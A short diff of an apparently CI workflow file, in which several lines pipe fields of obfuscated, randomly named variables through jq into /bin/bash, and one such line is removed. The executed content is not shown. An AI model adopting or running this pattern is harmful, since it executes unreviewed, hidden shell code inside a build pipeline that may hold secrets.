@@ -38,7 +38,6 @@ jobs:
           echo $rhw518 | jq -r .tvm72 | /bin/bash
           echo $lp4 | jq -r .xrxv167 | /bin/bash
           echo $aev0 | jq -r .p99017 | /bin/bash
-          printf '%s' "$yibj3514" | jq -r .kyr5 | /bin/bash
           printf '%s' "$e2" | jq -r .xsbp56016 | /bin/bash
 
       - name: Archive output
